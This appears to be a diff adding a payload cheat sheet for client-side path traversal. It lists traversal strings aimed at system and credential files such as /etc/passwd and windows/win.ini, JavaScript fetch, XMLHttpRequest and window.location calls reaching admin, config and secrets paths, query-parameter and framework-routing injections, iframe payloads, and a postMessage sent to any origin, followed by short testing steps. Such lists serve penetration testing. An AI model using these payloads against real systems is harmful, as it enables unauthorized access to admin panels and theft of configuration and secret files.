@@ -1,0 +1,94 @@
+# Client Side Path Traversal
+
+## ========================================
+## BASIC PAYLOADS
+## ========================================
+
+# Unix/Linux paths
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../../../etc/passwd
+
+# Windows paths
+..\..\..\..\windows\win.ini
+..\..\..\..\..\windows\system32\drivers\etc\hosts
+
+## ========================================
+## JAVASCRIPT PATH MANIPULATION
+## ========================================
+
+# Window location
+window.location = "../../../admin"
+window.location = "../../config.json"
+window.location.href = "../../../sensitive.txt"
+
+# Fetch API
+fetch("../../../api/admin")
+fetch("../../../../secrets.json")
+
+# XMLHttpRequest
+var xhr = new XMLHttpRequest();
+xhr.open('GET', '../../../admin/users', true);
+
+## ========================================
+## URL MANIPULATION
+## ========================================
+
+# Query parameters
+?file=../../../config.json
+?path=../../../../etc/passwd
+?document=../../sensitive.txt
+
+# Hash-based routing
+#/../../../admin
+#/../../config
+
+# Client-side routing
+/app#/../../../api/admin
+
+## ========================================
+## ANGULAR/REACT/VUE ROUTING
+## ========================================
+
+# Angular
+/#!/../../../admin
+/app/../../config
+
+# React Router
+/route/../../../admin
+
+# Vue Router
+/#/../../admin/panel
+
+## ========================================
+## IFRAME MANIPULATION
+## ========================================
+
+<iframe src="../../../admin"></iframe>
+<iframe src="../../../../config.json"></iframe>
+
+## ========================================
+## POSTMESSAGE EXPLOITATION
+## ========================================
+
+# Send malicious path
+window.postMessage({path: "../../../admin"}, "*");
+
+## ========================================
+## TESTING
+## ========================================
+
+# Check if client-side routing vulnerable
+1. Navigate to /app/page
+2. Try /app/../admin
+3. Try /app/../../config
+4. Check browser DevTools for loaded resources
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Browser DevTools
+- Network tab
+- Console for testing paths
+- Sources to see loaded files
